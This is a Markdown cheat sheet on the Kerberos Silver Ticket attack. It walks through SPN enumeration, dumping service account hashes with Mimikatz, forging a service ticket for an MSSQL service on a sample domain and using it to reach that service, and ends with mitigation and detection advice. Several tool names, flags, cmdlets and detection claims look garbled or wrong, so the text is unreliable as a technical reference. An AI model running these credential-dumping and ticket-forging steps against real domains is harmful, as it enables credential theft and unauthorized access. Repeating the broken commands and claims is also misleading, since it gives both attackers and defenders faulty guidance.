# **Silver Ticket - Kerberos Attack**

## **Understanding Silver Ticket**

- A **Silver Ticket** is a forged Kerberos Service Ticket (TGS) used to access specific services within a domain. Unlike the **Golden Ticket**, which is forged using the KRBTGT account (Domain Controller’s account), the Silver Ticket uses the **service account’s** credentials.
- The primary purpose of a Silver Ticket attack is to provide **unauthorized access to specific services** in the domain, even if the attacker does not have domain admin privileges.
- Silver Tickets are useful when attackers can compromise service account credentials (such as the service account password hash or NTLM hash).

---

## **How Silver Ticket Works**

1. **Forging the Ticket:**
   - The attacker forges a **service ticket (TGS)** using the service account's credentials. This ticket can then be used to access a specific service (e.g., SMB, HTTP) within the domain.
   - A Silver Ticket contains the **service principal name (SPN)**, the **client’s username**, the **service's encryption key**, and a **timestamp**.
2. **Ticket Validation:**
   - The forged TGS is validated by the target service using the **service account's password hash** or **NTLM hash**. If the attacker has the correct hash, they can authenticate successfully without needing to interact with a Domain Controller.

---

## **Tools and Techniques**

### **Enumerating SPNs (PowerView):**

- **Identify Service Principal Names (SPNs):**

  ```powershell
  Get-DomainComputer -Properties servicePrincipalName
  ```

  - This lists all SPNs in the domain, which are useful for targeting specific services when crafting a Silver Ticket.

- **Check for Service Accounts with Known Hashes:**
  ```powershell
  Get-ADServiceAccount -Filter * | Get-ADAccountPasswordLastSet
  ```

---

### **Performing Silver Ticket Attack (Impacket, Mimikatz):**

- **Steps Involved:**
  1.  **Obtain Service Account Credentials:**
      - Use techniques such as **OSINT**, **pass-the-hash**, or **credential dumping** tools (e.g., Mimikatz) to retrieve service account credentials.
  2.  **Forge Silver Ticket:**
      - Using the service account's credentials, forge a TGS with tools like **Impacket** or **Mimikatz**.
  3.  **Access the Target Service:**
      - Use the forged TGS to authenticate to the target service.

---

## **Attack Workflow (Silver Ticket):**

### **Step 1: Obtain Service Account Credentials (Mimikatz)**

- Dump the service account hash using **Mimikatz**:

```powershell
sekurlsa::logonPasswords
```

- Look for service account credentials (e.g., for `MSSQLSvc`, `HTTP`, etc.).

### **Step 2: Forge Silver Ticket (Impacket)**

- Use **Impacket's** `GetTGT` tool to create a Silver Ticket:

```bash
python3 ticket_generator.py -domain <domain> -sid <sid> -spn MSSQLSvc/<target>.<domain> -rc4 <service_account_hash>
```

- This will generate a forged service ticket (`tgs.kirbi`) for the target service.

### **Step 3: Use Silver Ticket to Access Service**

- Use **Impacket's** `smbclient.py` to authenticate to the target service using the Silver Ticket:

```bash
python3 smbclient.py <domain>/<target> -k -tgs <tgs.kirbi>
```

- The attacker now has access to the service without needing to communicate with a Domain Controller.

---

## **Example Attack Workflow (Full):**

1. **Dump Service Account Credentials:**

   ```powershell
   sekurlsa::logonPasswords
   ```

   - Identify a service account's credentials (e.g., `MSSQLSvc` account).

2. **Forge Silver Ticket (Impacket):**

   ```bash
   python3 ticket_generator.py -domain corp.local -sid S-1-5-21-1234567890 -spn MSSQLSvc/sqlserver.corp.local -rc4 <hash>
   ```

   - Generate the Silver Ticket (`tgs.kirbi`).

3. **Use Silver Ticket to Access Service:**
   ```bash
   python3 smbclient.py corp.local/sqlserver.corp.local -k -tgs tgs.kirbi
   ```
   - Successfully authenticate to the target service using the forged Silver Ticket.

---

## **Detection and Mitigation**

### **Mitigation Techniques:**

1. **Monitor Service Account Hash Exposure:**

   - Ensure that service account credentials are **not leaked** or **dumped** using techniques like pass-the-hash or Mimikatz.
   - Restrict access to service account hashes and store them securely.

2. **Set Strong Service Account Passwords:**

   - Use long, complex passwords for service accounts and **enable managed service accounts (MSAs)** to automatically manage passwords.

3. **Limit SPN Assignments:**

   - Ensure SPNs are only registered for legitimate services and are not misused for forging tickets.

4. **Use Kerberos Armoring (Kerberos Pre-Authentication):**
   - Enable **Kerberos pre-authentication** to prevent attackers from intercepting or modifying tickets during authentication.

---

### **Detection Techniques:**

- **Event Logs:**

  - Monitor **Event ID 4769** (TGS-REQ) for abnormal TGS requests or requests for suspicious services.
  - Monitor **Event ID 4672** for privileged account logins that may be related to Silver Ticket attacks.

- **Network Traffic Analysis:**

  - Analyze Kerberos ticket requests for anomalies such as repeated requests for the same service or requests from unauthorized clients.

- **Check for Silver Ticket Presence (Impacket):**
  - Check for forged TGS tickets using Impacket’s `krb5tgs` tool:
  ```bash
  python3 krb5tgs.py <tgt.kirbi>
  ```

---

## **Testing Silver Ticket Configurations**

- **Verify Service Account Credentials:**

  ```powershell
  Get-ADServiceAccount -Filter * | Get-ADAccountPasswordLastSet
  ```

- **Review SPN Assignments:**
  ```powershell
  Get-ADComputer -Filter * -Properties servicePrincipalName
  ```

---

## **Real-World Impact:**

- **Unauthorized Access to Services:**
  - Gain access to critical services (e.g., SQL Server, IIS) using Silver Tickets, bypassing the need for domain administrator privileges.
- **Privilege Escalation:**
  - Use Silver Tickets to impersonate higher-privileged accounts and escalate privileges within the domain.
- **Persistence and Lateral Movement:**
  - Maintain access to services and move laterally within the network by forging tickets for multiple services.

---

## **Example Scenario (Full):**

1. **Enumerate SPNs for Target Services:**

   ```powershell
   Get-DomainComputer -Filter {servicePrincipalName -ne $null}
   ```

2. **Forge Silver Ticket for Target Service:**

   ```bash
   python3 ticket_generator.py -domain corp.local -spn MSSQLSvc/sqlserver.corp.local -rc4 <hash>
   ```

3. **Authenticate to Service Using Silver Ticket:**
   ```bash
   python3 smbclient.py corp.local/sqlserver.corp.local -k -tgs tgs.kirbi
   ```

---

## **⚠️Disclaimer⚠️**

This guide is for **educational purposes only**. Unauthorized exploitation of Silver Tickets is illegal and unethical. Always conduct penetration tests with **proper authorization**.
